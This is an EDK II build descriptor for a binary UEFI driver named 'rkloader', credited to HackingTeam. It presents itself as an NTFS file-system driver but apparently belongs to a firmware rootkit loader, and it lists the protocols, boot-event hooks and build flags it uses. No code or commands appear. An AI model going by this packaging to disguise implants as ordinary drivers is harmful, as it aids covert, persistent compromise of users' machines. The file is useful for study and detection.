## @file
#
#  Binary NTFS EFI Driver for IA32, X64, IPF and EBC arch.
#
#  This UEFI driver detects the NTFS file system in the disk.
#  It also produces the Simple File System protocol for the consumer to
#  perform file and directory operations on the disk.
#
#  Copyright (c) 2012 - 2014, ]HackingTeam[. All rights reserved.<BR>
#
#
##

[Defines]
  INF_VERSION                = 0x00010016
  BASE_NAME                  = rkloader
  FILE_GUID                  = f50258a9-2f4d-4da9-861e-bda84d07a44c
  MODULE_TYPE                = UEFI_DRIVER
  VERSION_STRING             = 1.0

[Packages]
  MdePkg/MdePkg.dec

[Binaries.X64]
  PE32|rkloader.efi

[PatchPcd.X64]
[Protocols.X64]
  gEfiDiskIoProtocolGuid

  gEfiBlockIoProtocolGuid

  gEfiSimpleFileSystemProtocolGuid

  gEfiUnicodeCollationProtocolGuid

  gEfiUnicodeCollation2ProtocolGuid

  gEfiLoadedImageProtocolGuid

  ## CONSUMES
  gEfiDevicePathProtocolGuid

  ## CONSUMES
  gEfiDevicePathUtilitiesProtocolGuid

  ## CONSUMES
  gEfiDevicePathToTextProtocolGuid

  ## CONSUMES
  gEfiDevicePathFromTextProtocolGuid

  ## PRODUCES
  gEfiDriverBindingProtocolGuid

  ## CONSUMES
  gEfiSimpleTextOutProtocolGuid

  ## CONSUMES
  gEfiGraphicsOutputProtocolGuid

  ## CONSUMES
  gEfiHiiFontProtocolGuid

  ## SOMETIMES_CONSUMES (Consumes if gEfiGraphicsOutputProtocolGuid uninstalled)
  gEfiUgaDrawProtocolGuid

  ## SOMETIMES_PRODUCES (User chooses to produce it)
  gEfiComponentNameProtocolGuid

  ## SOMETIMES_PRODUCES (User chooses to produce it)
  gEfiComponentName2ProtocolGuid

  ## SOMETIMES_CONSUMES (User chooses to produce it)
  gEfiDriverConfigurationProtocolGuid

  ## SOMETIMES_CONSUMES (User chooses to produce it)
  gEfiDriverConfiguration2ProtocolGuid

  ## SOMETIMES_CONSUMES (User chooses to produce it)
  gEfiDriverDiagnosticsProtocolGuid

  ## SOMETIMES_CONSUMES (User chooses to produce it)
  gEfiDriverDiagnostics2ProtocolGuid

[Ppis.X64]
[Guids.X64]
  gEfiFileInfoGuid

  gEfiFileSystemInfoGuid

  gEfiFileSystemVolumeLabelInfoIdGuid

  ## CONSUMES  ## Event
  gEfiEventReadyToBootGuid

  ## CONSUMES  ## Event
  gEfiEventLegacyBootGuid

  ## CONSUMES  ## Variable
  gEfiGlobalVariableGuid

[PcdEx.X64]

## @AsBuilt
##   MSFT:RELEASE_VS2010x86_X64_SYMRENAME_FLAGS = Symbol renaming not needed for
##   MSFT:RELEASE_VS2010x86_X64_ASLDLINK_FLAGS = /NODEFAULTLIB /ENTRY:ReferenceAcpiTable /SUBSYSTEM:CONSOLE
##   MSFT:RELEASE_VS2010x86_X64_VFR_FLAGS = -l -n
##   MSFT:RELEASE_VS2010x86_X64_PP_FLAGS = /nologo /E /TC /FIAutoGen.h
##   MSFT:RELEASE_VS2010x86_X64_GENFW_FLAGS = 
##   MSFT:RELEASE_VS2010x86_X64_SLINK_FLAGS = /NOLOGO /LTCG
##   MSFT:RELEASE_VS2010x86_X64_ASM_FLAGS = /nologo /c /WX /W3 /Cx /Zd
##   MSFT:RELEASE_VS2010x86_X64_ASL_FLAGS = 
##   MSFT:RELEASE_VS2010x86_X64_CC_FLAGS = /nologo /wd4201 /W4 /Gy /c /D UEFI_BUILD /D HAVE_CONFIG_H /D UNICODE /Od /FIAutoGen.h /EHa-s-c- /GF /Gs8192 /Zi /Gm /GS- /D MDEPKG_NDEBUG
##   MSFT:RELEASE_VS2010x86_X64_VFRPP_FLAGS = /nologo /E /TC /DVFRCOMPILE /FI$(MODULE_NAME)StrDefs.h
##   MSFT:RELEASE_VS2010x86_X64_ASLCC_FLAGS = /nologo /c /FIAutoGen.h /TC /Dmain=ReferenceAcpiTable
##   MSFT:RELEASE_VS2010x86_X64_APP_FLAGS = /nologo /E /TC
##   MSFT:RELEASE_VS2010x86_X64_OPTROM_FLAGS = -e
##   MSFT:RELEASE_VS2010x86_X64_DLINK_FLAGS = /NOLOGO /NODEFAULTLIB /IGNORE:4001 /IGNORE:4254 /OPT:REF /OPT:ICF=10 /MAP /ALIGN:32 /SECTION:.xdata,D /SECTION:.pdata,D /Machine:X64 /LTCG /DLL /ENTRY:$(IMAGE_ENTRY_POINT) /SUBSYSTEM:EFI_BOOT_SERVICE_DRIVER /SAFESEH:NO /BASE:0 /DRIVER /MERGE:.data=.text /MERGE:.rdata=.text
##   MSFT:RELEASE_VS2010x86_X64_ASLPP_FLAGS = /nologo /E /C /FIAutoGen.h
##   MSFT:RELEASE_VS2010x86_X64_OBJCOPY_FLAGS = objcopy not needed for
##   MSFT:RELEASE_VS2010x86_X64_MAKE_FLAGS = /nologo
##   MSFT:RELEASE_VS2010x86_X64_ASMLINK_FLAGS = /nologo /tiny
